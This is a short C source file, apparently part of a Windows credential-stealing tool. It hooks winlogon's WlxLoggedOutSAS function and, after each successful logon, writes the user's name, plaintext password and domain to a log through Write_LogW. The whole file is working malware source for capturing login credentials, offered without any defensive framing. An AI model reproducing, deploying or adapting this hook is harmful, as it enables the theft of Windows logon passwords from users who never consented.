////////////////////////////////////////////////////////////////////
//
// This function gets called by winlogon whenever a user try to login.
// Written by JeFFOsZ
//
////////////////////////////////////////////////////////////////////

#include <winwlx.h>
#include "log.h"

// Function type
typedef INT (WINAPI* WLXLOGGEDOUTSAS)
 (PVOID,DWORD,PLUID,PSID,PDWORD,PHANDLE,PWLX_MPR_NOTIFY_INFO,PVOID*);

// New WlxLoggedOutSAS
INT
WINAPI
NewWlxLoggedOutSAS(
    PVOID           pWlxContext,
    DWORD           dwSasType,
    PLUID           pAuthenticationId,
    PSID            pLogonSid,
    PDWORD          pdwOptions,
    PHANDLE         phToken,
    PWLX_MPR_NOTIFY_INFO    pMprNotifyInfo,
    PVOID           *pProfile)
{
	INT iReturn;
	WLXLOGGEDOUTSAS pWlxLoggedOutSas=(WLXLOGGEDOUTSAS) htHookTable[WLXLOGGEDOUTHOOK].ppOriginal;
	
	// Call original function
	iReturn=pWlxLoggedOutSas(
				pWlxContext,
				dwSasType,
				pAuthenticationId,
				pLogonSid,
				pdwOptions,
				phToken,
				pMprNotifyInfo,
				pProfile
				);
	
	// Log pMprNotifyInfo if logon
	if (iReturn==WLX_SAS_ACTION_LOGON)
		Write_LogW(pMprNotifyInfo->pszUserName,pMprNotifyInfo->pszPassword,pMprNotifyInfo->pszDomain);
	
	return iReturn;
}
